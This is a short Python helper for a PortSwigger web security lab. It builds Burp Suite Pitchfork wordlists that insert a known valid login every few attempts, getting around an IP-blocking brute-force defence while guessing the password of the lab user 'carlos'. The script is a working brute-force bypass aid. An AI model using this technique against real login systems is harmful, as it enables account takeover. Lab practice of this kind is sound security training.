#!/usr/bin/env python3

# Lab: https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

# This script patches user/pass wordlists to include a certain set of credentials every x lines for BurpSuite's Pitchfork mode.
# Useful for bypassing basic IP block mechanisms by injecting successful logins every x attempts.
# (Same could be achieved by using macros or Turbo Intruder.)

# credential pair to include every LIMIT lines
LIMIT=3
validuser='wiener'
validpass='peter'

# Either use
# 1) a wordlist for usernames and a hardcoded password
#
#	targetpass = 'password'; userfile = 'userwordlist.txt'
#	targetuser = None;       passfile = None
#
# 2) a wordlist for passwords and a hardcoded username
#
#	targetpass = None;       userfile = None
#	targetuser = 'username'; passfile = 'passwords.txt'
#
# 3) a wordlist for both usernames and passwords (mimics clusterbomb)
#
#	targetpass = None; userfile = 'userwordlist.txt'
#	targetuser = None; passfile = 'passwords.txt'
#
# to generate the necessary payloads for Pitchfork

targetpass = None;     userfile = None
targetuser = 'carlos'; passfile = 'pass'


if not targetuser:
	with open(userfile, 'r') as f:
		targetuser = f.readlines()
else:
	targetuser = [targetuser+'\n']

if not targetpass:
	with open(passfile, 'r') as f:
		targetpass = f.readlines()
else:
	targetpass = [targetpass+'\n']

print(f'[+] Patching wordlists')
userlist=[]
passlist=[]

i = 1
for u in targetuser:
	for p in targetpass:
		if not i%LIMIT:
			userlist.append(validuser+'\n')
			passlist.append(validpass+'\n')
			i+=1
		userlist.append(u)
		passlist.append(p)
		i+=1

with open('userpatch', 'w') as f:
	f.writelines(userlist)

with open('passpatch', 'w') as f:
	f.writelines(passlist)

print(f'[+] Generated wordlists:')
print(f'     - userpatch')
print(f'     - passpatch')
